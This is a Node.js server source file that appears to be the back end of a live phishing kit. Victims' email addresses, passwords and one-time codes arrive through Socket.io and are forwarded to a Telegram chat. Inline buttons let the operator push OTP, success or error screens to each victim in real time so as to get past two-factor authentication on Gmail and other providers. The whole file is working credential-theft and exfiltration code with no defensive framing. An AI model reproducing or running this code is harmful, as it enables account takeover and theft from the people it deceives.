const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');
dotenv.config();
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
  polling: true,
   request: {
    timeout: 30000  // 30 seconds timeout instead of default
  } 
});

// Add error handler to suppress any remaining errors
bot.on('polling_error', (error) => {
  // Silently ignore
});

bot.on('error', (error) => {
  // Silently ignore  
});


// Store active sessions
const sessions = new Map(); 

function generateUniqueId() {
  return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
}


// Socket.io connection
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);
  const sessionId = generateUniqueId();   

  // Send sessionId to frontend
  socket.emit('your-session-id', sessionId);

  // Store socket session
  sessions.set(sessionId, {
    socketId: socket.id,
    provider: null,
    email: null,
    password: null,
    otp: null,
    timestamp: new Date()
  });  

   socket.on('reconnect-session', (data) => {
    const session = sessions.get(data.sessionId);
    if (session) {
      console.log(`Updating socket for session ${data.sessionId}: ${session.socketId} → ${socket.id}`);
      session.socketId = socket.id; // Update to new socket ID
    }
  }); 

  // Handle email submission
  socket.on('submit-email', async (data) => {
    const session = sessions.get(data.sessionId);
    session.provider = data.provider;
    session.email = data.email;
    
    console.log('Email submitted:', data);

    const message = `📧 *New Login Attempt*\n\n` +
      `*Provider:* ${data.provider}\n` +
      `*Email:* ${data.email}\n` +
      `*Status:* Waiting for password...\n` +
      `*Session:* \`${sessionId}\``;

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  });

  // Handle password submission
  socket.on('submit-password', async (data) => {
    const session = sessions.get(data.sessionId);
    session.password = data.password;
    
    console.log('Password submitted:', data);

    const message = `🔐 *Password Received*\n\n` +
      `*Provider:* ${session.provider}\n` +
      `*Email:* ${session.email}\n` +
       `*Password:* ${data.password}\n` +
      `*Session:* \`${sessionId}\``;



     // Different keyboard for Gmail vs others
  const keyboard = session.provider === 'Gmail' ? {
    inline_keyboard: [
      [
        { text: '✅ Send OTP', callback_data: `send_otp_${sessionId}` }
      ],
      [
        { text: '🔢 Send OTP with Special Number', callback_data: `send_otp_with_number_${sessionId}` }  
      ],
      [
        { text: '✔️ Mark Complete', callback_data: `mark_complete_${sessionId}` }
      ],
      [
        { text: '❌ Reject', callback_data: `reject_${sessionId}` }
      ]
    ]
  } : {
    inline_keyboard: [
      [
        { text: '✅ Send OTP', callback_data: `send_otp_${sessionId}` },
        { text: '✔️ Mark Complete', callback_data: `mark_complete_${sessionId}` }
      ],
      [
        { text: '❌ Reject', callback_data: `reject_${sessionId}` }
      ]
    ]
  }; 



    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
        parse_mode: 'Markdown',
        reply_markup: keyboard
      });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  });

  // Handle OTP submission
  socket.on('submit-otp', async (data) => {
    const session = sessions.get(data.sessionId);
    session.otp = data.otp;
    
    console.log('OTP submitted:', data);

    const message = `🔢 *OTP Submitted*\n\n` +
      `*Provider:* ${session.provider}\n` +
      `*Email:* ${session.email}\n` +
      `*OTP Code:* \`${data.otp}\`\n` +
      `*Session:* \`${sessionId}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: '✔️ Mark Complete', callback_data: `mark_complete_${sessionId}` }
        ],
        [
          { text: '🔄 Request Again', callback_data: `request_again_${sessionId}` }
        ]
      ]
    };

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
        parse_mode: 'Markdown',
        reply_markup: keyboard
      });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  });     


// cleanup old sessions
const SESSION_TIMEOUT = 60 * 60 * 1000; // 1 hour in milliseconds
function cleanupOldSessions() {
  const now = Date.now();
  for (const [socketId, session] of sessions.entries()) {
    const sessionAge = now - session.timestamp.getTime();
    if (sessionAge > SESSION_TIMEOUT) {
      console.log(`Cleaning up old session: ${socketId}`);
      sessions.delete(socketId);
    }
  }
} 
// Run cleanup every 10 minutes
setInterval(cleanupOldSessions, 10 * 60 * 1000);


  // Handle disconnect
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id); 
  });
});

// Telegram bot callback handlers
bot.on('callback_query', async (callbackQuery) => { 
  const messageId = callbackQuery.message.message_id;
  const chatId = callbackQuery.message.chat.id; 
  const data = callbackQuery.data; // e.g., "send_otp_qf9IUm6UEPQcrjogAAAE"
  const parts = data.split('_');

  const sessionId = parts[parts.length - 1]; // LAST part is the session ID
  const action = parts.slice(0, -1).join('_'); // everything else = action, e.g., "send_otp"

   const session = sessions.get(sessionId); 

  if (!session) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: '❌ Session expired or user disconnected',
      show_alert: true
    });
    return;
  }


   // ✅ NOW GET SOCKET USING socketId FROM SESSION
  const socket = io.sockets.sockets.get(session.socketId);

    if (!socket || !socket.connected) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: '❌ User disconnected',
      show_alert: true
    });
    return;
  }

  switch (action) {
    case 'send_otp': {
      console.log('Sending OTP screen to socket:', sessionId);
      console.log('=== SEND OTP DEBUG ===');
      console.log('Session ID:', sessionId);
      console.log('Socket exists?', !!socket);
      console.log('Socket connected?', socket?.connected);
    socket.emit('show-otp-screen');
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: '✅ OTP screen sent to user'
    });
    await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
      chat_id: chatId,
      message_id: messageId
    });
    break;  
  }





        case 'send_otp_with_number': {   
      await bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, '🔢 Enter the special number to send (1-99):');
      
      // Wait for the number input
      bot.once('message', async (msg) => {
        if (msg.chat.id === chatId) {
          const specialNumber = msg.text;
          
          // Store it in session
          const session = sessions.get(sessionId);
          if (session) {
            session.specialNumber = specialNumber;
          }
          
          // Send to frontend
          socket.emit('show-otp-with-number', { number: specialNumber });
          
          await bot.sendMessage(chatId, `✅ Sent OTP screen with special number: ${specialNumber}`);
        }
      });
      break;
    }




    case 'mark_complete': {
    socket.emit('show-success-screen');
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: '✅ Marked as complete! User sees success page.'
    });
    await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
      chat_id: chatId,
      message_id: messageId
    });
    const session = sessions.get(sessionId);
    const summary = `✅ *Session Completed*\n\n` +
      `*Provider:* ${session.provider}\n` +
      `*Email:* ${session.email}\n` +
      `*Password:* \`${session.password}\`\n` +
      `*OTP:* ${session.otp || 'N/A'}\n` +
      `*Time:* ${new Date().toLocaleString()}`;
    await bot.sendMessage(TELEGRAM_CHAT_ID, summary, { parse_mode: 'Markdown' });
    break;
  }


    case 'request_again': {
    const session = sessions.get(sessionId); 
  if (session && session.specialNumber) { 
    socket.emit('show-otp-with-number', { number: session.specialNumber });
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: `🔄 OTP screen with special number ${session.specialNumber} shown again`
    });
  } else {
    // Normal OTP, show normal screen
    socket.emit('show-otp-screen');
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: '🔄 OTP screen shown again'
    });
  }
  break;
   }


    case 'reject': {
      // Reject session
      socket.emit('show-error', { message: 'Authentication failed. Please try again.' });
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: '❌ Session rejected'
      });
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: chatId,
        message_id: messageId
      }); 
      break; 
    }
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    activeSessions: sessions.size,
    timestamp: new Date()
  });
});

// Start server
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Telegram bot is active`);
  console.log(`🔌 Socket.io server is ready`);
});

// Error handling
process.on('unhandledRejection', (error) => {
  console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught exception:', error);
});